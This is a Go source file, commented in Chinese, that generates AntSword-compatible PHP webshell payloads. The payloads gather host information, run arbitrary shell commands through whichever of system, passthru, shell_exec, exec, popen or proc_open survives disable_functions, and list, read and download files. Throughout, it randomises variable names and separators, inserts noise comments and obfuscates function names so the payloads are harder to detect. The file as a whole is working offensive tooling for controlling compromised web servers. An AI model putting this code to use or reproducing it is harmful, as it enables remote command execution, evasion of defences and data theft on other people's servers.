// Package php 提供 Python demo（antsword_client.py）中 AntSword 兼容的 PHP 模板的 Go 移植。
//
//	本文件定义 PHP 代码片段；renderer 负责把参数名拼进去。
//
// ⚠️ 按照设计文档，这个包是 ADAPTER 不是 core。任何 PHP / AntSword 专属的协议面
//
//	都只能留在这里，不能污染下层。
package php

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
)

// PHPTemplates 包含适配器使用的全部 PHP 代码模板。
type PHPTemplates struct{}

// NewPHPTemplates 构建一个 PHPTemplates 实例。
func NewPHPTemplates() *PHPTemplates { return &PHPTemplates{} }

// randomVar 生成长度为 n 的随机变量名片段。
func randomVar(n int) string {
	buf := make([]byte, (n+1)/2)
	_, _ = rand.Read(buf)
	out := hex.EncodeToString(buf)
	if len(out) > n {
		out = out[:n]
	}
	return out
}

func randomVar6() string { return randomVar(6) }

func randomHex(n int) string {
	buf := make([]byte, (n+1)/2)
	_, _ = rand.Read(buf)
	out := hex.EncodeToString(buf)
	if len(out) > n {
		out = out[:n]
	}
	return out
}

const (
	placeholderBase64Path = "#{base64::path}"
	placeholderBase64Bin  = "#{base64::bin}"
	placeholderBase64Cmd  = "#{base64::cmd}"
	placeholderBase64Env  = "#{base64::env}"
)

type Separators struct {
	KeySep  string
	LineSep string
}

func NewSeparators() Separators {
	return Separators{
		KeySep:  "|||" + randomHex(8) + "|||",
		LineSep: "|||" + randomHex(8) + "|||",
	}
}

type funcCheck struct {
	ref    string
	caller string
}

func shuffleChecks(checks []funcCheck) {
	for i := len(checks) - 1; i > 0; i-- {
		buf := make([]byte, 1)
		_, _ = rand.Read(buf)
		j := int(buf[0]) % (i + 1)
		checks[i], checks[j] = checks[j], checks[i]
	}
}

func buildGlobalList(checks []funcCheck) string {
	refs := ""
	for i, c := range checks {
		if i > 0 {
			refs += ","
		}
		refs += c.ref
	}
	return refs
}

func (t *PHPTemplates) Info() (string, map[string]string) {
	code := "$D=dirname($_SERVER[\"SCRIPT_FILENAME\"]);"
	code += "if($D==\"\")$D=dirname($_SERVER[\"PATH_TRANSLATED\"]);"
	code += "$R=\"{$D}\\t\";"
	code += "if(substr($D,0,1)!=\"/\"){foreach(range(\"C\",\"Z\")as $L)if(is_dir(\"{$L}:\"))$R.=\"{$L}:\";}else{$R.=\"/\";}"
	code += "$R.=\"\\t\";"
	code += "$u=(function_exists(\"posix_getegid\"))?@posix_getpwuid(@posix_geteuid()):\"\";"
	code += "$s=($u)?$u[\"name\"]:@get_current_user();"
	code += "$R.=php_uname();$R.=\"\\t{$s}\";echo $R;"
	return code, map[string]string{}
}

func (t *PHPTemplates) Exec() (string, map[string]string) {
	v := [3]string{randomVar6(), randomVar6(), randomVar6()}
	seps := NewSeparators()

	b64S, b64R := obfuscatedFuncSubstr("base64_decode")
	sysR := obfuscatedFuncRefSubstr("system")
	psR := obfuscatedFuncRefSubstr("passthru")
	seR := obfuscatedFuncRefSubstr("shell_exec")
	exR := obfuscatedFuncRefSubstr("exec")
	poR := obfuscatedFuncRefSubstr("popen")
	prR := obfuscatedFuncRefSubstr("proc_open")

	varP := phpVar6()
	varS := phpVar6()
	varEnv := phpVar6()
	varC := phpVar6()
	varR := phpVar6()
	varRet := phpVar6()
	varO := phpVar6()
	varDir := phpVar6()
	varFe := phpVar6()
	varRuncmd := phpVar6()
	varEnvArr := phpVar6()
	varEnvKey := phpVar6()

	checks := []funcCheck{
		{ref: sysR, caller: fmt.Sprintf("@%s($%s,$%s)", sysR, varC, varRet)},
		{ref: psR, caller: fmt.Sprintf("@%s($%s,$%s)", psR, varC, varRet)},
		{ref: seR, caller: fmt.Sprintf("print(@%s($%s))", seR, varC)},
		{ref: exR, caller: fmt.Sprintf("@%s($%s,$%s,$%s);print(join(\"\\n\",$%s))", exR, varC, varO, varRet, varO)},
		{ref: poR, caller: fmt.Sprintf("$%s=@%s($%s,'r');while(!@feof($%s)){print(@fgets($%s,2048));}@pclose($%s)", phpVar6(), poR, varC, phpVar6(), phpVar6(), phpVar6())},
		{ref: prR, caller: fmt.Sprintf("$%s=@%s($%s,array(1=>array('pipe','w'),2=>array('pipe','w')),$%s);while(!@feof($%s[1])){print(@fgets($%s[1],2048));}while(!@feof($%s[2])){print(@fgets($%s[2],2048));}$%s=0;@fclose($%s[1]);@fclose($%s[2]);@proc_close($%s)", phpVar6(), prR, varC, phpVar6(), phpVar6(), phpVar6(), phpVar6(), varRet, phpVar6(), phpVar6())},
	}
	shuffleChecks(checks)

	ifElseChain := ""
	for i, check := range checks {
		cond := "if"
		if i > 0 {
			cond = "elseif"
		}
		ifElseChain += cond + "(fe(" + check.ref + ")){" + check.caller + "}"
	}
	ifElseChain += "else{$" + varRet + "=127;}"

	noiseComment := ""
	buf := make([]byte, 1)
	_, _ = rand.Read(buf)
	if buf[0]%3 == 0 {
		noiseComment = "/*" + randomHex(8) + "*/"
	}

	code := "" +
		b64S + ";" +
		"$" + varP + "=" + b64R + "(substr($_POST['" + v[0] + "'],0));" +
		"$" + varS + "=" + b64R + "(substr($_POST['" + v[1] + "'],0));" +
		"$" + varEnv + "=@" + b64R + "(substr($_POST['" + v[2] + "'],0));" +
		"$" + varDir + "=dirname($_SERVER['SCRIPT_FILENAME']);" +
		"$" + varC + "=(substr($" + varDir + ",0,1)=='/')?'-c ' . '\"' . $" + varS + ".'\"' : '/c ' . '\"' . $" + varS + ".'\"';" +
		"if(substr($" + varDir + ",0,1)=='/'){" +
		"  @putenv('PATH=' . getenv('PATH') . ':/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin');" +
		"}else{" +
		"  @putenv('PATH=' . getenv('PATH') . ';C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;');" +
		"}" +
		"if(!empty($" + varEnv + ")){$" + varEnvArr + "=explode('" + seps.LineSep + "',$" + varEnv + ");foreach($" + varEnvArr + " as $" + varEnvKey + "){if(!empty($" + varEnvKey + ")){@putenv(str_replace('" + seps.KeySep + "','=',$" + varEnvKey + "));}}}" +
		"$" + varR + "=$" + varP + ".' '.$" + varC + ";" +
		noiseComment +
		"function fe($f){$" + varFe + "=explode(',',@ini_get('disable_functions'));" +
		"if(empty($" + varFe + ")){$" + varFe + "=array();}else{$" + varFe + "=array_map('trim',array_map('strtolower',$" + varFe + "));}" +
		"return(function_exists($f)&&is_callable($f)&&!in_array($f,$" + varFe + "));}" +
		"function runcmd($" + varRuncmd + "){global " + buildGlobalList([]funcCheck{{ref: sysR}, {ref: psR}, {ref: seR}, {ref: exR}, {ref: poR}, {ref: prR}}) + ";$" + varRet + "=0;$" + varDir + "=dirname($_SERVER['SCRIPT_FILENAME']);" +
		ifElseChain +
		"return $" + varRet + ";}" +
		"$" + varRet + "=@runcmd($" + varR + ".' 2>&1');" +
		"if($" + varRet + "!=0){echo 'ret=' . $" + varRet + ";}"

	params := map[string]string{
		v[0]: placeholderBase64Bin,
		v[1]: placeholderBase64Cmd,
		v[2]: placeholderBase64Env,
	}
	_ = seps
	return code, params
}

func (t *PHPTemplates) FileList() (string, map[string]string) {
	v := randomVar6()
	errPrefix := "ERR:" + randomHex(8) + ":"
	b64S, b64R := obfuscatedFuncSubstr("base64_decode")
	code := b64S + ";" + "$O=" + b64R + "(substr($_POST[\"" + v + "\"],0));"
	code += "if(substr($O,-1)!=\"/\"){$O.=\"/\";}"
	code += "$F=@opendir($O);if($F===false){echo(\"" + errPrefix + "PATH_UNAVAILABLE\");"
	code += "}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$O.$N;$T=@date(\"Y-m-d H:i:s\",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R=\"\\t\".$T.\"\\t\".@filesize($P).\"\\t\".$E.\"\\n\";if(@is_dir($P))$M.=$N.\"/\".$R;else $L.=$N.$R;}echo $M.$L;@closedir($F);}"
	return code, map[string]string{v: placeholderBase64Path}
}

func (t *PHPTemplates) FileRead() (string, map[string]string) {
	v := randomVar6()
	errPrefix := "ERR:" + randomHex(8) + ":"
	b64S, b64R := obfuscatedFuncSubstr("base64_decode")
	code := b64S + ";" + "$L=" + b64R + "(substr($_POST[\"" + v + "\"],0));"
	code += "$P=@fopen($L,\"rb\");if($P===false){echo(\"" + errPrefix + "FILE_OPEN_FAILED\");}else{$C=@stream_get_contents($P);@fclose($P);if($C===false){echo(\"" + errPrefix + "FILE_READ_FAILED\");}else{echo $C;}}"
	return code, map[string]string{v: placeholderBase64Path}
}

func (t *PHPTemplates) FileDownload() (string, map[string]string) {
	v := randomVar6()
	errPrefix := "ERR:" + randomHex(8) + ":"
	b64S, b64R := obfuscatedFuncSubstr("base64_decode")
	code := b64S + ";" + "$Q=" + b64R + "(substr($_POST[\"" + v + "\"],0));"
	code += "$P=@fopen($Q,\"rb\");if($P===false){echo(\"" + errPrefix + "FILE_OPEN_FAILED\");}else{@fclose($P);$N=@readfile($Q);if($N===false){echo(\"" + errPrefix + "FILE_READ_FAILED\");}}"
	return code, map[string]string{v: placeholderBase64Path}
}
